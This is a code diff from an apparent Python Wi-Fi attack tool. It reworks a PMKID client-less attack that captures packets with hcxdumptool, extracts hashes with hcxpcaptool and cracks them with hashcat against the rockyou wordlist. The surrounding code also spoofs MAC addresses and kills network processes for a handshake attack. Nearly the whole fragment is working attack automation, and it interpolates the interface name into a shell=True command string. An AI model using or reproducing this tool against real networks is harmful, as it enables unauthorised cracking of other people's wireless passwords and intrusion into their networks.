@@ -127,7 +127,6 @@ def attack_func(network_interface, attack_mode):
     get_colours("\nNew Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
-
     # HandShake Attack Mode
     if attack_mode == "Handshake":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
@@ -160,32 +159,32 @@ def attack_func(network_interface, attack_mode):
         get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
-        try:
-            subprocess.run(
-                ["sudo hcxdumptool -i " + network_interface + "mon --enable_status=1 -o Capture_PKMID"], shell=True,
-                timeout=20)
-        except subprocess.TimeoutExpired:
-            get_colours("\nClearing Temporary files..", "red")
-            print(Fore.WHITE)
+        process = subprocess.Popen(f"sudo hcxdumptool -i {network_interface}mon --enable_status=1 -o Capture_PKMID",
+                                   shell=True)
+        time.sleep(10)
+        process.send_signal(signal.SIGINT)
+        subprocess.run(["clear"])
+        get_colours("\nClearing Temporary files..", "red")
+        print(Fore.WHITE)
+        time.sleep(3)
+        get_colours("", "yellow")
+        subprocess.run(["clear"])
+        get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
+                                          capture_output=True, text=True, shell=True)
+        subprocess.run(["clear"])
+        get_colours("\n[*] Trying getting hashes", "magenta")
+        time.sleep(2)
+        subprocess.run(["rm", "Capture_PKMID"])
+        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
+            get_colours("\nStarting with Brute-Force attack..", "cyan")
             time.sleep(3)
             get_colours("", "yellow")
-            subprocess.run(["clear"])
-            get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"],
-                                              capture_output=True, text=True)
-            subprocess.run(["clear"])
-            get_colours("\nTrying getting hashes", "magenta")
-            time.sleep(2)
-            subprocess.run(["rm", "Capture_PKMID"])
-            if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
-                get_colours("\nStarting with Brute-Force attack..", "cyan")
-                time.sleep(3)
-                get_colours("", "yellow")
-                subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
-                                "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
-            else:
-                time.sleep(1)
-                get_colours("\n[-] no packet captured...", "red")
-                quit_program()
+            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
+                            "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
+        else:
+            time.sleep(1)
+            get_colours("\n[-] no packet captured...", "red")
+            quit_program()
 
 
 def quit_program():
